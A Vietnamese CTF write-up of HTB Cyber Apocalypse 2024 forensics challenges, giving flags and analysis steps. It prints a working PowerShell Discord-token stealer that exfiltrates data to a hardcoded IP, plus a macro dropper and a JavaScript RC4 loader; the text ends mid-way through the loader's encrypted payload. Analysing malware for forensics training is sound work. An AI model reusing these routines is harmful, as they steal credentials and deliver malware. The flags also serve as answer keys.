# __**HTB Cyber Apocalypse 2024 [Forensics]**__

## _it_has_begun_

Bài cho 1 file bash. Flag có 2 phần, 1 phần bị đảo ngược và 1 phần base64 encoded

![image](https://hackmd.io/_uploads/H1X8_VDA6.png)

Flag: `HTB{w1ll_y0u_St4nd_y0uR_Gr0uNd!!}`

## _Urgent_

Bài cho 1 file `.eml`, đính kèm file `onlineform.html`, đọc source có thể thấy một đoạn url encoded, đáp lên CyberChef và để nó nấu.

![image](https://hackmd.io/_uploads/HkJfcEDCp.png)

Flag: `HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}`

## _An Unusual Sighting_
Bài cho 2 file bash_history.txt và sshd.log. nc vào server để trả lời câu hỏi và nhận flag

### What is the IP Address and Port of the SSH Server (IP:PORT)
> 100.72.1.95:47721

Đọc log là tìm được
```
[2024-01-28 15:24:23] Connection from 100.72.1.95 port 47721 on 100.107.36.130 port 2221 rdomain ""
```
### What time is the first successful Login
> 2024-02-13 11:29:50

Đọc log là tìm được
```
[2024-02-13 11:29:50] Connection from 100.81.51.199 port 63172 on 100.107.36.130 port 2221 rdomain ""
[2024-02-13 11:29:50] Failed publickey for root from 100.81.51.199 port 63172 ssh2: ECDSA SHA256:NdSnAx2935O7s2KX4LyvIV0gCzzQW5eXYoiiIBosqNE
[2024-02-13 11:29:50] Accepted password for root from 100.81.51.199 port 63172 ssh2
[2024-02-13 11:29:50] Starting session: shell on pts/2 for root from 100.81.51.199 port 63172 id 0
```
### What is the time of the unusual Login
> 2024-02-19 04:00:14

Trong tất cả sessions thì thòi ra 1 chỗ connect lúc 4h sáng, ròi làm thêm phát `whoami` nữa :v
### What is the Fingerprint of the attacker's public key
> OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4

vẫn là đọc log là tìm được

```
[2024-02-19 04:00:14] Failed publickey for root from 2.67.182.119 port 60071 ssh2: ECDSA SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
```
### What is the first command the attacker executed after logging in
> whoami

*whoami*
```
[2024-02-19 04:00:18] whoami
```
### What is the final command the attacker executed before logging out
> ./setup

```
[2024-02-19 04:14:02] ./setup
```
Flag: `HTB{B3sT_0f_luck_1n_th3_Fr4y!!}`

## _Pursue The Tracks_
Bài này dùng `MFTECmd` export ra file `.csv` rồi đọc. Cũng đơn giản nên rush đáp án thui.
```
Files are related to two years, which are those?
> 2023,2024

There are some documents, which is the name of the first file written?
> Final_Annual_Report.xlsx

Which file was deleted?
> Marketing_Plan.xlsx

How many of them have been set in Hidden mode?
> 1

Which is the filename of the important TXT file that was created?
> credentials.txt

A file was also copied, which is the new filename?
> Financial_Statement_draft.xlsx

Which file was modified after creation?
> Project_Proposal.pdf

What is the name of the file located at record number 45?
> Annual_Report.xlsx

What is the size of the file located at record number 40?
> 57344
```
## _Fake Boost_
Export trong file network capture ra 1 file `discordnitro.ps1`, deobfuscate ra để đọc
```
$URL = "http://192.168.116.135:8080/rj1893rj1joijdkajwda"

function Steal {
    param (
        [string]$path
    )

    $tokens = @()

    try {
        Get-ChildItem -Path $path -File -Recurse -Force | ForEach-Object {

            try {
                $fileContent = Get-Content -Path $_.FullName -Raw -ErrorAction Stop

                foreach ($regex in @('[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}', 'mfa\.[\w-]{80,95}')) {
                    $tokens += $fileContent | Select-String -Pattern $regex -AllMatches | ForEach-Object {
                        $_.Matches.Value
                    }
                }
            } catch {}
        }
    } catch {}

    return $tokens
}

function GenerateDiscordNitroCodes {
    param (
        [int]$numberOfCodes = 10,
        [int]$codeLength = 16
    )

    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    $codes = @()

    for ($i = 0; $i -lt $numberOfCodes; $i++) {
        $code = -join (1..$codeLength | ForEach-Object { Get-Random -InputObject $chars.ToCharArray() })
        $codes += $code
    }

    return $codes
}

function Get-DiscordUserInfo {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true)]
        [string]$Token
    )

    process {
        try {
            $Headers = @{
                "Authorization" = $Token
                "Content-Type" = "application/json"
                "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36"
            }

            $Uri = "https://discord.com/api/v9/users/@me"

            $Response = Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers
            return $Response
        }
        catch {}
    }
}

function Create-AesManagedObject($key, $IV, $mode) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"

    if ($mode="CBC") { $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC }
    elseif ($mode="CFB") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CFB}
    elseif ($mode="CTS") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CTS}
    elseif ($mode="ECB") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB}
    elseif ($mode="OFB"){$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::OFB}


    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Encrypt-String($key, $plaintext) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}

Write-Host "
______              ______ _                       _   _   _ _ _               _____  _____  _____   ___
|  ___|             |  _  (_)                     | | | \ | (_) |             / __  \|  _  |/ __  \ /   |
| |_ _ __ ___  ___  | | | |_ ___  ___ ___  _ __ __| | |  \| |_| |_ _ __ ___   `' / /'| |/' |`' / /'/ /| |
|  _| '__/ _ \/ _ \ | | | | / __|/ __/ _ \| '__/ _` | | . ` | | __| '__/ _ \    / /  |  /| |  / / / /_| |
| | | | |  __/  __/ | |/ /| \__ \ (_| (_) | | | (_| | | |\  | | |_| | | (_) | ./ /___\ |_/ /./ /__\___  |
\_| |_|  \___|\___| |___/ |_|___/\___\___/|_|  \__,_| \_| \_/_|\__|_|  \___/  \_____/ \___/ \_____/   |_/

                                                                                                         "
Write-Host "Generating Discord nitro keys! Please be patient..."

$local = $env:LOCALAPPDATA
$roaming = $env:APPDATA
$part1 = "SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf"

$paths = @{
    'Google Chrome' = "$local\Google\Chrome\User Data\Default"
    'Brave' = "$local\BraveSoftware\Brave-Browser\User Data\Default\"
    'Opera' = "$roaming\Opera Software\Opera Stable"
    'Firefox' = "$roaming\Mozilla\Firefox\Profiles"
}

$headers = @{
    'Content-Type' = 'application/json'
    'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36'
}

$allTokens = @()
foreach ($platform in $paths.Keys) {
    $currentPath = $paths[$platform]

    if (-not (Test-Path $currentPath -PathType Container)) {continue}

    $tokens = Steal -path $currentPath
    $allTokens += $tokens
}

$userInfos = @()
foreach ($token in $allTokens) {
    $userInfo = Get-DiscordUserInfo -Token $token
    if ($userInfo) {
        $userDetails = [PSCustomObject]@{
            ID = $userInfo.id
            Email = $userInfo.email
            GlobalName = $userInfo.global_name
            Token = $token
        }
        $userInfos += $userDetails
    }
}

$AES_KEY = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="
$payload = $userInfos | ConvertTo-Json -Depth 10
$encryptedData = Encrypt-String -key $AES_KEY -plaintext $payload

try {
    $headers = @{
        'Content-Type' = 'text/plain'
        'User-Agent' = 'Mozilla/5.0'
    }
    Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $encryptedData
}
catch {}

Write-Host "Success! Discord Nitro Keys:"
$keys = GenerateDiscordNitroCodes -numberOfCodes 5 -codeLength 16
$keys | ForEach-Object { Write-Output $_ }
```
Có sẵn part1 trong script rồi, base64 decode là ra `HTB{fr33_N17r0G3n_3xp053d!_`
Part 2 nằm trong phần thông tin đưa lên server bị mã hóa AES như trong script, decrypt dựa vào script là ra part2 ở dòng email bị base64 encoded
```
[
    {
        "ID":  "1212103240066535494",
        "Email":  "YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9",
        "GlobalName":  "phreaks_admin",
        "Token":  "MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk"
    },
    {
        "ID":  "1212103240066535494",
        "Email":  "YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9",
        "GlobalName":  "phreaks_admin",
        "Token":  "MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk"
    }
]
```
Flag: `HTB{fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}`
## _Phreaky_
Trong file network capture có 15 stream chứa 15 phần của 1 file pdf, mỗi phần dữ liệu bị nén vào file zip, base64 encoded, pass file zip có trong mail, làm manual luôn cho nhanh. ~~khongphaidoluoicode~~

![image](https://hackmd.io/_uploads/H1GU5rv0T.png)

Flag trong file pdf

![image](https://hackmd.io/_uploads/HyIgnSD06.png)

Flag: `HTB{Th3Phr3aksReadyT0Att4ck}`

## _Game Invitation_
Bài cho 1 file docm, dùng `olevba` check script macro
```
Function JFqcfEGnc(given_string() As Byte, length As Long) As Boolean
Dim xor_key As Byte
xor_key = 45
For i = 0 To length - 1
given_string(i) = given_string(i) Xor xor_key
xor_key = ((xor_key Xor 99) Xor (i Mod 254))
Next i
JFqcfEGnc = True
End Function

Sub AutoClose() 'delete the js script'
On Error Resume Next
Kill IAiiymixt
On Error Resume Next
Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
aMUsvgOin.DeleteFile kWXlyKwVj & "\*.*", True
Set aMUsvgOin = Nothing
End Sub

Sub AutoOpen()
On Error GoTo MnOWqnnpKXfRO
Dim chkDomain As String
Dim strUserDomain As String
chkDomain = "GAMEMASTERS.local"
strUserDomain = Environ$("UserDomain")
If chkDomain <> strUserDomain Then

Else

Dim gIvqmZwiW
Dim file_length As Long
Dim length As Long
file_length = FileLen(ActiveDocument.FullName)
gIvqmZwiW = FreeFile
Open (ActiveDocument.FullName) For Binary As #gIvqmZwiW
Dim CbkQJVeAG() As Byte
ReDim CbkQJVeAG(file_length)
Get #gIvqmZwiW, 1, CbkQJVeAG
Dim SwMbxtWpP As String
SwMbxtWpP = StrConv(CbkQJVeAG, vbUnicode)
Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
Dim vTxAnSEFH
    Set vTxAnSEFH = CreateObject("vbscript.regexp")
    vTxAnSEFH.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
    Set I4j833DS5SFd34L3gwYQD = vTxAnSEFH.Execute(SwMbxtWpP)
Dim Y5t4Ul7o385qK4YDhr
If I4j833DS5SFd34L3gwYQD.Count = 0 Then
GoTo MnOWqnnpKXfRO
End If
For Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD
Y5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex
Exit For
Next
Dim Wk4o3X7x1134j() As Byte
Dim KDXl18qY4rcT As Long
KDXl18qY4rcT = 13082
ReDim Wk4o3X7x1134j(KDXl18qY4rcT)
Get #gIvqmZwiW, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j
If Not JFqcfEGnc(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then
GoTo MnOWqnnpKXfRO
End If
kWXlyKwVj = Environ("appdata") & "\Microsoft\Windows"
Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
If Not aMUsvgOin.FolderExists(kWXlyKwVj) Then
kWXlyKwVj = Environ("appdata")
End If
Set aMUsvgOin = Nothing
Dim K764B5Ph46Vh
K764B5Ph46Vh = FreeFile
IAiiymixt = kWXlyKwVj & "\" & "mailform.js"
Open (IAiiymixt) For Binary As #K764B5Ph46Vh
Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
Close #K764B5Ph46Vh
Erase Wk4o3X7x1134j
Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
R66BpJMgxXBo2h.Run """" + IAiiymixt + """" + " vF8rdgMHKBrvCoCp0ulm"
ActiveDocument.Save
Exit Sub
MnOWqnnpKXfRO:
Close #K764B5Ph46Vh
ActiveDocument.Save
End If
End Sub
```
Đọc sơ qua thì thấy nó check Username và Domain, nếu trùng sẽ tiến hành chạy tiếp script, đẻ ra 1 file trong `\AppData\Roaming\Microsoft\Windows\`. Phần còn lại lười đọc quá mình ném luôn vào máy ảo, sửa script để tiến hành chạy macro bất chấp tên máy đẻ ra file `mailform.js` ở thư mục trên nhưng ngăn không cho file chạy `WScript.Shell`, rồi vào thư mục lấy file ra, cho đi làm đẹp cho dễ đọc, ta có script sau
```
var lVky = WScript.Arguments;
var DASz = lVky(0);
var Iwlh = lyEK();
Iwlh = JrvS(Iwlh);
Iwlh = xR68(DASz, Iwlh);
eval(Iwlh);

function af5Q(r) {
    var a = r.charCodeAt(0);
    if (a === 43 || a === 45) return 62;
    if (a === 47 || a === 95) return 63;
    if (a < 48) return -1;
    if (a < 48 + 10) return a - 48 + 26 + 26;
    if (a < 65 + 26) return a - 65;
    if (a < 97 + 26) return a - 97 + 26
}

function JrvS(r) {
    var a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    var t;
    var l;
    var h;
    if (r.length % 4 > 0) return;
    var u = r.length;
    var g = r.charAt(u - 2) === "=" ? 2 : r.charAt(u - 1) === "=" ? 1 : 0;
    var n = new Array(r.length * 3 / 4 - g);
    var i = g > 0 ? r.length - 4 : r.length;
    var z = 0;

    function b(r) {
        n[z++] = r
    }
    for (t = 0, l = 0; t < i; t += 4, l += 3) {
        h = af5Q(r.charAt(t)) << 18 | af5Q(r.charAt(t + 1)) << 12 | af5Q(r.charAt(t + 2)) << 6 | af5Q(r.charAt(t + 3));
        b((h & 16711680) >> 16);
        b((h & 65280) >> 8);
        b(h & 255)
    }
    if (g === 2) {
        h = af5Q(r.charAt(t)) << 2 | af5Q(r.charAt(t + 1)) >> 4;
        b(h & 255)
    } else if (g === 1) {
        h = af5Q(r.charAt(t)) << 10 | af5Q(r.charAt(t + 1)) << 4 | af5Q(r.charAt(t + 2)) >> 2;
        b(h >> 8 & 255);
        b(h & 255)
    }
    return n
}

function xR68(r, a) {
    var t = [];
    var l = 0;
    var h;
    var u = "";
    for (var g = 0; g < 256; g++) {
        t[g] = g
    }
    for (var g = 0; g < 256; g++) {
        l = (l + t[g] + r.charCodeAt(g % r.length)) % 256;
        h = t[g];
        t[g] = t[l];
        t[l] = h
    }
    var g = 0;
    var l = 0;
    for (var n = 0; n < a.length; n++) {
        g = (g + 1) % 256;
        l = (l + t[g]) % 256;
        h = t[g];
        t[g] = t[l];
        t[l] = h;
        u += String.fromCharCode(a[n] ^ t[(t[g] + t[l]) % 256])
    }
    return u
}

function lyEK() {
    var r = "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